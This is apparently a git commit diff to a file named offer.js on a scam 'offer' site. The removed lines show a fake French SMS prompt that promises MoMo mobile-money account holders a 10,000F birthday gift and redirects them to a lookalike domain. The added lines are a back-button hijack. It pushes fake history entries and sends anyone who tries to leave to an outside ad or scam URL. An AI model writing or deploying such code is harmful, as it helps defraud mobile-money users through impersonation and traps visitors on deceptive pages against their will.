646712bf831e292b0c8c6bc7b48106b004d04844
KENNY <examtapz+me@gmail.com>
2026-08-07 01:29:47 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,8 +1,11 @@
-/* Password Protection Script by www.onlineofferz.xyz*/
-var password = '10.000F'
-password=prompt('SMS: Félicitations, votre compte MoMo est qualifié pour recevoir le cadeau MoMo de 10 000F pour le Jour de Anniversaire. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
-if (password != '10.000F') {
-location.href='https://momo-bn.go-career.xyz/Offre';
-}
-
-
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://hai8g.com/4/10368794";
+    }
+    function goon(){
+        location.href="https://hai8g.com/4/10368794";
+    }
